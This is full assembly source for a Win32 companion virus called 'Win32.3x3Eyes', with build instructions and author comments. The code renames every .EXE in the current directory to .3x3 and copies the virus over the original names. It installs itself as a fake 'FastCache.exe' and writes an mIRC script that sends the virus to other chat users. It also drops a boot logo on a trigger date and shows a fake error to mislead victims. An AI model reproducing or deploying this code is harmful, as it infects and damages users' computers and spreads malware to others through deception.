;
;  Win32.3x3Eyes virus. Coded by Bumblebee[UC].
;
;  . This is a Win32 companion virus using 100% API. So this is compatible
;  with Win9x and WinNt. I did it in less than four hours trying to show
;  how easy can be coding a simple Win32 virus.
;
;  . Renames infected files to .3x3. Copies vx as the old name of the file...
;  and the tryes to exec the file .3x3 that has the same name as the .exe
;  that is running. If an error occurs while is trying to exec host a lame
;  message box appears... this can confuse the user. Don't infect files
;  twice 'cause 'MoveFileA' doesn't works if destination file exists yet.
;
;  . This virus has mIRC worm capabilities.
;
;  . In May 9h -date when i was accepted as UC member- shows a message box
;  and drops a bmp file to c:\ called Logo.sys. This changes the start up
;  screen while windows is loading with the UC logo. The bmp is ffh RLE
;  compressed. I descopress it 'cause windows only accepts a uncompress
;  bmp for this issue. Compressing with ffh RLE spents a lot of space.
;
;  . Files needed for compile:
;
;        eyes.asm       -> code
;        3x3.inc        -> bmp compressed
;
;  . To compile:
;
;       tasm32 /ml /m3 eyes,,;
;       tlink32 -Tpe -c eyes,eyes,, import32.lib
;

.386
locals
jumps
.model flat,STDCALL

        ; procs to import
        extrn           ExitProcess:PROC
        extrn        FindFirstFileA:PROC
        extrn         FindNextFileA:PROC
        extrn             FindClose:PROC
        extrn       GetCommandLineA:PROC
        extrn             MoveFileA:PROC
        extrn             CopyFileA:PROC
        extrn               WinExec:PROC
        extrn           MessageBoxA:PROC
        extrn         GetSystemTime:PROC
        extrn           CreateFileA:PROC
        extrn             WriteFile:PROC
        extrn           CloseHandle:PROC
        extrn           GetFileSize:PROC
        extrn  GetCurrentDirectoryA:PROC
        extrn  SetCurrentDirectoryA:PROC
        extrn           DeleteFileA:PROC

        L                       equ <LARGE>

.DATA

include 3x3.inc
bmpSize         equ     offset bmpName-offset bmp

bmpName         db      'C:\Logo.sys',0 ; name for bmp
                                        ; name to install in windows dir
windoze         db      'C:\Windows\FastCache.exe',0
fHnd            dd      ?               ; handle for files
shit            dd      0               ; for write process
cont0           dd      0               ; for loops
cont1           db      0               ; for loops

findData        db      316 dup(0)      ; data for ffirst and fnext
fMask           db      '*.EXE'         ; mask for finding exe files
ffHnd           dd      ?               ; handle for ffirst and fnext
hostName        db      260 dup(0)      ; space for save host name
hwoArgs         db      260 dup(0)      ; host without arguments
futureHostName  db      260 dup(0)      ; space for save new host name
chDir           db      260 dup(0)      ; space for save current dir
commandLine     dd      ?               ; handle for command line
sysTimeStruct   db      16 dup(0)       ; space for system time struct

; mIRC script
scriptName      db      'Script.ini',0
mIRCScript      db      '[SCRIPT]',0,0dh,0ah
                db      'n0=on 1:TEXT:*sting*:#:/msg $chan Win32.3x3Eyes'
                db      ' by Bumblebee[UC] ready to kill!',0
                db      0dh,0ah
                db      'n1=on 1:TEXT:*dcc*:#:/msg $chan Who wants FastCache'
                db      ' prog?',0,0dh,0ah
                db      'n2=on 1:FILESENT:*.*:/if ( $me != $nick ) { /dcc send'
                db      ' $nick C:\Windows\FastCache.exe }',0,0dh,0ah
endScript       db      0
scriptSize      equ     offset mIRCDir0-offset mIRCScript

; directories to search mirc
mIRCDir0        db      'c:\mirc',0
mIRCDir1        db      'c:\mirc32',0

; virus id and author
virusId         db      'Win32.3x3Eyes coded by Bumblebee[UC]',0
; message
mess            db      'This is my 1st contribution to Ultimate Chaos team.'
                db      0dh,0ah,'Gteetingz UC brothers!',0

; lame message to show when something goes wrong ;)
bmess           db      'Invalid call in shared memory 0x0cf689000.',0

.CODE

inicio:
        lea     eax,sysTimeStruct       ; check for payload
        push    eax
        call    GetSystemTime           ; get system time

        lea     eax,sysTimeStruct       ; may 9 -when i was accepted in UC-
        cmp     word ptr [eax+2],5      ; X=]
        jne     skipPay
        cmp     word ptr [eax+6],9
        jne     skipPay

        call    createBmp               ; creates a logo.sys in c:\

        push    L 1030h                 ; show a message box
        lea     eax,virusId
        push    eax
        lea     eax,mess
        push    eax
        push    L 0
        call    MessageBoxA

skipPay:
        call    GetCommandLineA         ; get command line
        mov     dword ptr [commandLine],eax

        xor     esi,esi                 ; copy it to get host path
        lea     edi,hostName            ; needed for infection process
copyLoop:
        mov     bl,byte ptr [eax+esi]
        mov     byte ptr [edi+esi],bl
        cmp     bl,0
        je      skipArgs
        inc     esi
        jmp     copyLoop

skipArgs:                               ; copy host name without args
        xor     esi,esi
        lea     edi,hwoArgs
        lea     eax,hostName
copyLoopb:
        mov     bl,byte ptr [eax+esi]
        mov     byte ptr [edi+esi],bl
        cmp     bl,'.'
        je      ffirst
        inc     esi
        jmp     copyLoopb

ffirst:
        mov     dword ptr [edi+esi],'EXE.' ; add extension
                                           ; now we have arguments in
                                           ; hostName and name only in
                                           ; hwoArgs
        push    0
        lea     eax,windoze
        push    eax
        lea     eax,hwoArgs
        push    eax
        call    CopyFileA               ; install in windows dir

        lea     eax,chDir
        push    eax                     ; get current directory
        push    260
        call    GetCurrentDirectoryA
        cmp     eax,0
        je      skipIrc

mIRCCheck:
        lea     eax,mIRCDir0
        push    eax
        call    SetCurrentDirectoryA
        cmp     eax,0
        je      installScript           ; directory exists -> mIRC found!

        lea     eax,mIRCDir1
        push    eax
        call    SetCurrentDirectoryA
        cmp     eax,0
        jne     retDir                  ; directory exists -> mIRC found!

installScript:
        lea     eax,scriptName
        push    eax                     ; delete script.ini
        call    DeleteFileA

        push    L 0h
        push    L 20h                   ; archive
        push    L 1
        push    L 0h
        push    L (1h OR 2h)
        push    40000000h
        lea     eax,scriptName
        push    eax
        call    CreateFileA             ; open new script for write (shared)
        cmp     eax,-1
        je      retDir

        mov     dword ptr [fHnd],eax

        push    L 0
        lea     eax,shit
        push    eax
        mov     eax,scriptSize
        push    eax
        lea     eax,mIRCScript
        push    eax
        push    dword ptr [fHnd]
        call    WriteFile               ; write script.ini

        mov     eax,dword ptr [fHnd]    ; close file
        push    eax
        call    CloseHandle

retDir:
        lea     eax,chDir
        push    eax                     ; restore work directory
        call    SetCurrentDirectoryA


skipIrc:
        lea     eax,findData
        push    eax
        lea     eax,fMask
        push    eax
        call    FindFirstFileA          ; find first *.EXE
        cmp     eax,-1
        je      execHost
        mov     dword ptr [ffHnd],eax

fnext:
        call    infectFile
skipThis:

        lea     eax,findData
        push    eax
        push    dword ptr [ffHnd]
        call    FindNextFileA           ; find next *.EXE
        cmp     eax,0
        jne     fnext

        push    dword ptr [ffHnd]
        call    FindClose               ; close ffist/fnext handle

execHost:
        xor     esi,esi                 ; copy hostName to future host Name
        lea     edi,futureHostName
        lea     eax,hostName
copyLoop2:
        mov     bl,byte ptr [eax+esi]
        mov     byte ptr [edi+esi],bl
        cmp     bl,'.'
        je      contExec
        inc     esi
        jmp     copyLoop2

contExec:
        mov     dword ptr [edi+esi],'3x3.' ; change ext to 3x3

        push    1
        push    edi
        call    WinExec                 ; exec host
        cmp     eax,32                  ; exec error?
        jb      lastOptionStealth       ; je stealth with lame message

goOut:
        push    L 0h
        call    ExitProcess             ; exit program

infectFile:
        xor     esi,esi                 ; copy file found name to
        lea     edi,futureHostName      ; future host name
        lea     eax,findData
        add     eax,44
icopyLoop:
        mov     bl,byte ptr [eax+esi]
        mov     byte ptr [edi+esi],bl
        cmp     bl,'.'
        je      continueInf
        inc     esi
        jmp     icopyLoop

continueInf:
        mov     dword ptr [edi+esi],'3x3.'  ; change ext to 3x3

        push    eax
        push    edi
        push    eax
        call    MoveFileA               ; rename the host to *.3x3

        pop     eax
        push    0
        push    eax
        lea     eax,hwoArgs
        push    eax
        call    CopyFileA               ; copy current host to new host
                                        ; (virus body)
        ret

lastOptionStealth:                      ; lame mess when we can't exec host
        push    L 1010h                 ; user can think the program is
        push    L 0h                    ; corrupted or windows goes
        lea     eax,bmess               ; wrong (very common =] )
        push    eax
        push    L 0
        call    MessageBoxA
        jmp     goOut

createBmp:
        push    L 0
        push    L 20h                   ; archive
        push    L 2
        push    L 0h
        push    L (1h OR 2h)
        push    L 40000000h
        lea     eax,bmpName
        push    eax
        call    CreateFileA             ; open new file for write (shared)
        cmp     eax,-1
        je      errBmp

        mov     dword ptr [fHnd],eax    ; save handle

        lea     edi,bmp                 ; uncompress and write the bmp
        mov     dword ptr [cont0],bmpSize
dcLoop:
        push    L 0
        lea     eax,shit
        push    eax
        push    L 1
        push    edi
        push    dword ptr [fHnd]
        call    WriteFile               ; write data

        cmp     byte ptr [edi],0ffh
        jne     skipFF

        dec     dword ptr [cont0]
        call    addFF
        inc     edi

skipFF:
        inc     edi
        dec     dword ptr [cont0]
        cmp     dword ptr [cont0],0
        jne     dcLoop

        push    dword ptr [fHnd]        ; close file
        call    CloseHandle

errBmp:
        ret

addFF:
        xor     ecx,ecx
        mov     cl,byte ptr [edi+1]
        mov     byte ptr [cont1],cl
        cmp     cl,0
        jne     addFFLoop
        ret

addFFLoop:
        push    L 0
        lea     eax,shit
        push    eax
        push    L 1
        push    edi
        push    dword ptr [fHnd]
        call    WriteFile               ; write data

        dec     byte ptr [cont1]
        cmp     byte ptr [cont1],0
        jne     addFFLoop

        ret

Ends
End inicio

